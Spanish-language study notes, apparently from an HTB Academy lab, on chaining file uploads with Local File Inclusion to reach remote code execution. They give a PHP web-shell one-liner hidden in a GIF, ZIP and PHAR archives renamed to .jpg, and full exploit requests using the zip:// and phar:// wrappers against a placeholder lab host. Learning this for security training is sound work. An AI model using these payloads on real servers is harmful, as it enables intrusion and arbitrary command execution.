
## 1. Concepto

Las funcionalidades de subida de archivos pueden combinarse con una vulnerabilidad **LFI (Local File Inclusion)** para conseguir **RCE (Remote Code Execution)**.

No es necesario que la funcionalidad de subida sea vulnerable. Basta con que permita subir un archivo y que la función vulnerable de inclusión pueda ejecutar el código que contiene.

Por ejemplo, una aplicación puede permitir subir imágenes de perfil. Si conseguimos incluir mediante LFI una imagen que contiene código PHP, este código podría ejecutarse si la función vulnerable interpreta su contenido como PHP.

**Requisitos principales:**

- La aplicación permite subir un archivo.
    
- Podemos identificar la ruta del archivo subido.
    
- Existe una vulnerabilidad LFI.
    
- La función vulnerable permite ejecutar el contenido incluido.
    

## 2. Funciones que pueden ejecutar código

|Lenguaje|Función|Leer contenido|Ejecutar código|URL remota|
|---|---|---|---|---|
|PHP|`include()` / `include_once()`|Sí|Sí|Sí|
|PHP|`require()` / `require_once()`|Sí|Sí|No|
|Node.js|`res.render()`|Sí|Sí|No|
|Java|`import`|Sí|Sí|Sí|
|.NET|`include`|Sí|Sí|Sí|

La técnica depende de las capacidades de la función vulnerable y del lenguaje utilizado por la aplicación.

# 3. Método 1: Carga de imágenes

## 3.1. Crear una imagen que contenga código PHP

El módulo propone utilizar una imagen GIF con código PHP incorporado.

```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

El archivo comienza con `GIF8`, una secuencia que puede ayudar a superar comprobaciones sencillas del formato de imagen.

El código PHP incluido es:

```
<?php system($_GET["cmd"]); ?>
```

Si la función vulnerable interpreta el contenido como PHP, el código puede ejecutar el comando indicado mediante el parámetro `cmd`.

**Importante:** añadir los bytes mágicos y utilizar una extensión permitida no garantiza que el archivo supere todas las validaciones. La técnica depende de cómo la aplicación compruebe y procese los archivos.

## 3.2. Subir el archivo

En el laboratorio, el archivo se sube mediante la página de configuración del perfil:

```
http://<SERVER_IP>:<PORT>/settings.php
```

Pasos:

1. Acceder a la configuración del perfil.
    
2. Seleccionar `shell.gif` como imagen de perfil.
    
3. Subir el archivo.
    
4. Comprobar que la subida se ha realizado correctamente.
    
5. Identificar la ruta donde se ha almacenado.
    

## 3.3. Identificar la ruta del archivo

Después de subir la imagen, podemos inspeccionar el código fuente HTML de la página.

El módulo muestra este ejemplo:

```
<img src="/profile_images/shell.gif"
     class="profile-image"
     id="profile-image">
```

Por tanto, la ruta del archivo es:

```
/profile_images/shell.gif
```

Si no conocemos el directorio de subida, podemos intentar identificarlo mediante enumeración de directorios y archivos.

## 3.4. Incluir el archivo mediante LFI

Una vez conocida la ruta, el módulo propone la siguiente petición:

```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

Si la función vulnerable ejecuta el código PHP contenido en el archivo, el comando `id` se ejecutará en el servidor.

### Consideraciones sobre la ruta

En este ejemplo se utiliza:

```
./profile_images/shell.gif
```

Esto se debe a que la vulnerabilidad no añade otro directorio delante de la entrada.

Si la aplicación añade un prefijo, puede ser necesario analizar la ruta resultante y comprobar si se puede acceder al directorio del archivo mediante Directory Traversal.

# 4. Método 2: Wrapper `zip://`

El wrapper `zip://` permite acceder a archivos contenidos en un archivo ZIP.

El módulo lo presenta como una alternativa cuando el método de inclusión directa de una imagen no funciona.

## 4.1. Crear el archivo PHP y comprimirlo

Primero, creamos el archivo PHP:

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Después, lo comprimimos en un archivo ZIP llamado `shell.jpg`:

```
zip shell.jpg shell.php
```

Aunque el archivo tiene extensión `.jpg`, su contenido es un archivo ZIP.

**Nota:** algunas aplicaciones detectan el formato real del archivo y pueden rechazarlo. La técnica depende de las validaciones de subida.

## 4.2. Incluir el archivo contenido en el ZIP

La estructura utilizada es:

```
zip://RUTA_ARCHIVO#ARCHIVO_INTERNO
```

En una URL, el carácter `#` debe codificarse como `%23` para que se transmita como parte del parámetro, en lugar de interpretarse como el inicio de un fragmento de URL.

Ejemplo del módulo:

```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

En este caso:

- `zip://` indica que se utiliza el wrapper ZIP.
    
- `./profile_images/shell.jpg` identifica el archivo comprimido.
    
- `%23shell.php` identifica el archivo PHP dentro del ZIP.
    
- `cmd=id` especifica el comando que se intenta ejecutar.
    

Si la aplicación procesa correctamente el archivo y ejecuta el contenido PHP, se puede conseguir RCE.

### Limitaciones

- El archivo debe estar disponible en la ruta especificada.
    
- La aplicación debe permitir subir el archivo comprimido o aceptar el archivo con la extensión utilizada.
    
- El wrapper y el comportamiento de inclusión deben ser compatibles con la técnica.

# 5. Método 3: Wrapper `phar://`

El wrapper `phar://` permite acceder a archivos contenidos en un archivo PHAR de PHP.

El módulo presenta esta técnica como otra alternativa específica de PHP.

## 5.1. Crear el archivo PHAR

Creamos un archivo llamado `shell.php` con el siguiente contenido:

```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString(
    'shell.txt',
    '<?php system($_GET["cmd"]); ?>'
);
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

Este script genera un archivo PHAR que contiene un archivo interno llamado `shell.txt`.

## 5.2. Generar el archivo PHAR

El módulo utiliza:

```
php --define phar.readonly=0 shell.php
```

La opción `phar.readonly=0` permite generar archivos PHAR cuando la configuración habitual lo impide.

Después, renombramos el archivo generado:

```
mv shell.phar shell.jpg
```

El resultado es un archivo PHAR con extensión `.jpg`.

## 5.3. Subir e incluir el archivo

Subimos `shell.jpg` mediante la funcionalidad de carga de archivos de la aplicación.

Después, utilizamos `phar://` para acceder al archivo interno:

```
phar://./profile_images/shell.jpg/shell.txt
```

La petición del módulo es:

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

En esta petición:

- `phar://` identifica el wrapper.
    
- `./profile_images/shell.jpg` identifica el archivo PHAR.
    
- `%2F` representa `/` codificado en URL.
    
- `shell.txt` identifica el archivo interno.
    
- `cmd=id` especifica el comando que se intenta ejecutar.
    

Si la aplicación procesa correctamente el archivo y ejecuta el código PHP, se puede obtener ejecución de comandos.

# 6. Comparativa de las técnicas

|Técnica|Archivo utilizado|Wrapper|Ventaja principal|
|---|---|---|---|
|Imagen con PHP|`shell.gif`|Ninguno adicional|Método directo si la inclusión interpreta el contenido como PHP.|
|Archivo comprimido|`shell.jpg` con `shell.php` dentro|`zip://`|Permite acceder a un archivo PHP contenido en un ZIP.|
|Archivo PHAR|`shell.jpg` con `shell.txt` dentro|`phar://`|Permite acceder a un archivo interno de un contenedor PHAR.|

**Orden recomendado según el módulo:**

1. Probar primero la inclusión directa de un archivo subido que contenga código PHP.
    
2. Si no funciona, investigar el wrapper `zip://`.
    
3. Como alternativa, investigar el wrapper `phar://`.
    

El primer método se considera el más fiable de los tres en el contexto descrito por HTB Academy.

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php
```

```
php --define phar.readonly=0 shell.php
mv shell.phar shell.jpg
```

### Wrapper ZIP

```
zip://./profile_images/shell.jpg%23shell.php
```

### Wrapper PHAR

```
phar://./profile_images/shell.jpg%2Fshell.txt
```

### Conceptos clave

- **LFI + carga de archivos:** puede permitir ejecutar código almacenado en un archivo subido.
    
- **La subida no necesita ser vulnerable:** basta con que permita almacenar un archivo accesible por la función vulnerable.
    
- **La ruta es fundamental:** hay que identificar dónde se guarda el archivo.
    
- **Extensión y contenido son distintos:** un archivo llamado `.jpg` no tiene por qué ser una imagen real.
    
- `**zip://**`**:** permite acceder a archivos dentro de un ZIP.
    
- `**phar://**`**:** permite acceder a archivos dentro de un contenedor PHAR.
    
- **Requisito esencial:** la función vulnerable debe poder ejecutar el código incluido.
    

**Idea clave:** una funcionalidad de subida aparentemente normal puede convertirse en una vía de RCE cuando se combina con una vulnerabilidad LFI que permite ejecutar el contenido del archivo subido.
